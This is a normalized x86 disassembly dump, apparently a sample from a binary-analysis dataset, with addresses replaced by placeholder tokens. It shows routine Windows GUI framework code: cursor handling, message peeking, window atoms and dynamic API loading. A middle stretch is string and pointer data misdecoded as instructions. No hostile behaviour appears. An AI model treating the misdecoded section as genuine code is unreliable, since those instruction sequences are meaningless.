test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44aa34
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406d48
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_449a90
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43ff08
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b3df
lea eax [ ebp - 0x48 ]
call sub_403f9c
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_446be4
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_43ec24
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_4410c4
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403f9c
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_44aee8
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4456dc
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_44aae8
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406d48
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_44af70
pop ecx
mov eax [ ebp - 0x4 ]
call sub_44aae8
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406d48
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_449a90
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_4402e4
jmp r-xdata
mov eax edi
call sub_45c824
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_449a90
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43fd64
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_4403c4
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403ff0
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44a9d4
jmp r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45df24
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_446be4
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
call sub_440a6c
jmp r-xdata
sub_44b3e8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40321c
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_403570
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_44b55c
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_44b478
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44b534
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40323c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_44b4dc
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_44b50c
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_406e3c
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_44b534
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44b4a8
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_44b55c
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_44b4c0
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_44b4dc
pop ebx
retn
mov eax ebx
call sub_44b50c
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_44b5c0
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44b726
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_44b844
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_44b828
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_44b828
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_44b934
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40324c
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_40324c
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_40324c
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_40324c
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403f9c
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403f9c
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_44b9bc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44bb34
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_408fcc
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_403ff0
mov eax [ rw-data ]
call sub_40445c
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_408fcc
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403ff0
mov eax [ rw-data ]
call sub_40445c
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_40445c
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a44c
mov [ rw-data ] eax
call sub_44b5c0
mov dl 0x1
mov eax [ r-xdata ]
call sub_44b3e8
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45d800
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45e8e4
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_460574
mov ecx r-xdata
mov edx sub_43d4d4
mov eax [ r-xdata ]
call sub_419c00
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bb3b
lea eax [ ebp - 0x10 ]
call sub_403f9c
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_44bba4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44bc03
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bc0a
retn
mov eax rw-data
call sub_40d420
call sub_44b934
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_404a50
mov eax rw-data
call sub_403f9c
mov eax rw-data
call sub_403f9c
sub_44bc0c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44bc92
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bc99
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_44b9bc
mov eax [ r-xdata ]
call sub_419a74
mov eax [ r-xdata ]
call sub_419b14
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419ac0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419ac0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419ac0
sub_44bee0
stc
push ebx
push eax
dec [ esi + eax * 8 - 0x392bffbc ]
inc esp
add al bl
enter 0x44 0xf8
enter 0x44 0x11
push esp
inc ebx
jne r-xdata
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0xc6
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080004 ] al
outsb
inc ebx
push 0x65676e61
sar [ ebp + r--data ] 0x0
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
or [ edi + 0x80044 ] bh
or [ ecx + 0x63 ] al
je r-xdata
test al 0x34
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add [ eax ] al
arpl [ ebp + 0x74 ] si
dec [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x6e4f0900
inc ebp
js r-xdata
dec eax
add [ eax ] al
dec esp
imul esi [ ebx + 0x74 ] 0xd31c0006
inc esp
add [ eax ] bh
add [ eax ] al
push [ eax + eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
push es
dec ecx
insd
popad
jae r-xdata
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax ] ch
add [ edx ] al
pushad
mov [ eax + eax + 0x38 ] 0x30004200
add [ edx ] eax
pushad
add eax [ edx ]
dec eax
add [ edx ] al
inc eax
add [ edx ] al
push 0xd0004203
lds eax [ eax + eax - 0x1c ]
mov [ eax + eax + 0x20 ] 0xb0044c7
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
or edx [ ecx + eax * 2 + 0x63 ]
je r-xdata
inc esp
add al al
test al 0x41
add [ eax - 0x1 ] dl
inc ecx
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ ecx + eax * 2 + 0x8000200 ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xbf800000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
mov edi 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x680044bf
add [ eax ] al
add [ eax - 0x42 ] bl
inc esp
add [ eax + 0x3 ] cl
inc edx
add [ eax - 0x63ffbfcc ] ah
cld
inc ecx
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ esi + eax * 8 ] bh
add [ eax ] al
xor al [ eax ]
add al 0xcb
inc ebx
jne r-xdata
outsb
push ebp
jo r-xdata
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0006 ] al
outsb
push ebx
je r-xdata
add [ eax ] al
[ eax ]
leave
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74617453
dec esp
jns r-xdata
mov esi 0x580044
add bh bh
sbb cl cl
inc esp
add [ ebx + ecx * 8 + 0x44 ] dl
add [ eax - 0x1 ] dl
inc ecx
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax ] ch
add [ edx ] al
test [ 0xffffffffc4240042 ] al
inc eax
add [ ebx + ecx * 8 ] al
dec esp
imul esi [ ebx + 0x74 ] 0xc1b8c08b
inc esp
add [ edi ] al
or eax 0x6f685354
jb r-xdata
inc ecx
add [ ebx + edi * 4 ] al
popad
je r-xdata
inc ecx
add al al
test al 0x41
add al bh
lodsb [ esi ]
inc ecx
add al dh
stosd [ edi ]
inc ecx
add ah cl
mov edx 0xbb000041
add [ esp + esi + 0x34a80040 ] ah
inc eax
je r-xdata
jne r-xdata
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
inc esp
add [ eax ] ah
rol [ eax + eax + 0x60 ] 0x1
sub [ eax ] al
inc edx
inc ebx
jne r-xdata
inc ecx
add [ eax ] cl
mov ebx 0xafdc0041
inc ecx
add [ esp + edi * 4 + 0x41 ] bh
add al bl
mov esp 0xbdac0041
inc ecx
add [ esi + esi * 4 - 0x4217ffbf ] bl
inc ecx
add [ esi + edi * 4 + 0x41 ] bl
add [ eax ] ch
rol [ eax + eax - 0x74 ] 0x1
mov eax 0xab380041
inc ecx
add [ eax ] ch
mov ecx 0xb9680041
inc ecx
add ah dl
mov ecx 0xaf880041
inc ecx
add [ ebx + edi * 4 + 0x41 ] ah
add [ eax + 0x640041b1 ] dl
mov dl 0x41
add [ eax - 0x4fffbe45 ] ah
mov ebx 0xb2c80041
inc ecx
add [ ebx + esi * 4 ] bl
inc ecx
add al cl
mov bl 0x41
add [ eax - 0x4b ] ah
inc ecx
add [ eax + 0x4c0041b5 ] bh
mov dh 0x41
add al dh
mov eax 0xb90c0041
inc ecx
add [ esp + edi * 4 ] al
inc ecx
add [ edx + edi * 4 + 0x41 ] dl
add [ esi + edi * 4 ] dl
inc ecx
add [ esi + edi * 4 ] ah
inc ecx
add [ 0x6f685354 ] cl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + eax * 8 + 0x300044 ] ah
add [ eax ] al
in al dx
lea eax [ eax ]
or al 0xc1
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x44c1 ] bh
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
and al 0xb8
xor al 0x40
inc ebx
push 0x65676e61
sar [ ebp + 0x500044 ] 0x0
call [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ eax ] cl
dec edi
add [ ecx ] 0x94
xor al 0x40
add [ eax - 0x5bffbfcc ] ah
xor al 0x40
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ eax + edi * 4 ] ah
add [ eax ] al
add ah ch
dec esp
jns r-xdata
add [ ebp + eax - 0x3bdbffbe ] al
dec esp
imul esi [ ebx + 0x74 ] r-xdata
fadd [ ebx + 0x41 ]
or [ ecx + 0x63 ] al
je r-xdata
add eax [ edx ]
dec eax
add [ edx ] al
inc eax
add [ edx ] al
push 0xb0004203
0x44
pushad
dec esp
imul esi [ ebx + 0x74 ] 0xc2280000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax * 8 + 0x44 ] bh
add al al
retn 0x44
sub_44c200
mov al [ 0xffffffff9c000000 ]
mov esp 0x3480044
inc edx
add [ eax - 0x63ffbfcc ] ah
cld
inc ecx
add [ eax - 0x63ffbfcc ] ch
xor al 0x40
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ ebx + ecx * 8 ] al
inc esp
add [ ebx + ecx * 8 + 0x44 ] dl
add [ eax - 0x1 ] dl
inc ecx
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax ] ch
add [ edx ] al
test [ 0xffffffffc4240042 ] al
inc esp
add [ eax ] ah
rol [ eax + eax + 0x60 ] 0x1
add eax [ edx ]
dec eax
add [ edx ] al
inc eax
add [ edx ] al
push 0xb0004203
0x44
sub_44c2a7
add [ eax + edx * 8 + 0x540d0044 ] dl
inc ebx
jne r-xdata
in al 0x31
je r-xdata
inc edx
add [ eax ] dh
add al 0x42
add [ eax + 0x4 ] ch
inc edx
inc eax
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ esp + eax ] dh
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
rol dl 0x44
add [ edi ] al
or eax 0x73754354
je r-xdata
add al cl
add al 0x42
add [ esp + eax + 0x4cc0042 ] bl
inc edx
add ah ch
add eax [ edx ]
add [ edx + eax * 2 ] 0x0
aam 0x4
inc edx
add [ eax - 0x33ffbb37 ] bh
leave
inc esp
add al ah
leave
inc esp
add ah dh
leave
inc esp
add [ eax ] cl
0x44
inc eax
add [ eax ] al
xor al [ eax ]
xor al 0x4
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
sub dl al
inc esp
add [ eax - 0x43 ] dh
inc esp
add [ ebx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xc3300000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x180044c3 ] ch
add [ eax ] al
add [ esp + ecx * 4 + 0x41 ] ah
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
sub_44c3b4
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420524
test bl bl
jle r-xdata
mov edx esi
call sub_44c7c8
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_44c424
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_420038
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_44c4cc
sub_44c458
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44c3e8
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_41a128
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_41a2b4
sub_44c4a0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_4043a8
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_403ff0
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_44c4cc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_44c7c8
mov edx ebx
mov eax esi
call sub_44c7a8
sub_44c4f4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44c4cc
sub_44c520
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_4612f0
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_403448
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_4205b0
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_43d300
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44c578
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_461318
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_403448
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_4205cc
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_43d300
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44c5d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41fbd8
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_44c754
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035c8
